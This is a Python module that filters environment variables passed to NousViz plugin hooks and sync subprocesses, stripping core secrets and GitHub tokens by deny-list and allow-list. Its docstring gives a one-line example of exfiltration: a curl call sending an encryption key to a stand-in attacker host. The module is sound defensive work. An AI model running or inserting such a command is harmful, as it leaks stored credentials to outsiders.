"""Env filters for plugin-author subprocess calls.

Plugin install hooks, uninstall hooks, and plugin sync subprocesses must
never receive core secrets. Core secrets that leak into a plugin's
environment can be exfiltrated by a single line of malicious hook code:
a `curl attacker/?k=$NOUSVIZ_ENCRYPTION_KEY` would compromise every
credential stored by NousViz.

Two helpers because hooks and sync have different needs:

  plugin_hook_env()  — for install / uninstall hooks (bash scripts)
                       Strip-list: preserve PATH, HOME, POSTGRES_*, etc.
                       but remove NOUSVIZ_*, GitHub tokens, and any other
                       operator secrets that may be set in the environment.

  plugin_sync_env()  — for sync subprocesses (Python scripts)
                       Allow-list: only pass what a sync script actually
                       needs (POSTGRES_*, LANG, PATH, TERM, VIRTUAL_ENV).
                       This is what existing sync.py used as
                       PLUGIN_ENV_ALLOWLIST — kept here for consistency.
"""
from __future__ import annotations

import os
from typing import Optional


# Exact-match variables to strip from hook environments.
_HOOK_STRIP_EXACT: frozenset[str] = frozenset({
    "GITHUB_TOKEN",
    "GH_TOKEN",
})

# Prefix-match variables to strip from hook environments.
_HOOK_STRIP_PREFIXES: tuple[str, ...] = (
    "NOUSVIZ_",
)

# Allow-list for sync subprocesses. Tighter than hook env because sync
# scripts have known needs; hooks legitimately may need whatever PATH
# extensions the user configured.
#
# v0.9.2 (B134): POSTGRES_USER, POSTGRES_PASSWORD, OPENROUTER_API_KEY removed.
# Plugins must use nousviz_sdk.get_pg_conn() (broker-authenticated as
# nousviz_plugin role) and get_credential() for OpenRouter keys.
# NOUSVIZ_PLUGIN_USER / NOUSVIZ_PLUGIN_PASSWORD are added as a low-privilege
# fallback for plugins not yet using the SDK broker.
_SYNC_ALLOWLIST: tuple[str, ...] = (
    "PATH", "HOME", "USER", "LANG", "LC_ALL", "TERM",
    "POSTGRES_HOST", "POSTGRES_PORT", "POSTGRES_DB",
    "POSTGRES_SSLMODE",
    "NOUSVIZ_PLUGIN_USER", "NOUSVIZ_PLUGIN_PASSWORD",
    "VIRTUAL_ENV",
)


def plugin_hook_env(extra: Optional[dict[str, str]] = None) -> dict[str, str]:
    """Build a hook-safe env dict. Strips core secrets; preserves everything
    else (PATH, HOME, POSTGRES_*, PYTHONPATH, etc.).

    Args:
        extra: Additional vars to set (e.g. `{"NOUSVIZ_DIR": "/opt/nousviz"}`).
               Applied last — note that `extra` values starting with
               NOUSVIZ_ or in the strip-list are NOT rejected; callers
               pass intentional context here.

    Returns:
        Filtered env dict suitable for `subprocess.run(..., env=...)`.
    """
    base = {
        k: v
        for k, v in os.environ.items()
        if k not in _HOOK_STRIP_EXACT
        and not any(k.startswith(p) for p in _HOOK_STRIP_PREFIXES)
    }
    if extra:
        base.update(extra)
    return base


def plugin_sync_env() -> dict[str, str]:
    """Build a sync-subprocess env dict via strict allow-list.

    Identical to the previous PLUGIN_ENV_ALLOWLIST pattern in sync.py.
    Kept here so all plugin-author subprocess code paths use one module.
    """
    return {k: os.environ[k] for k in _SYNC_ALLOWLIST if k in os.environ}
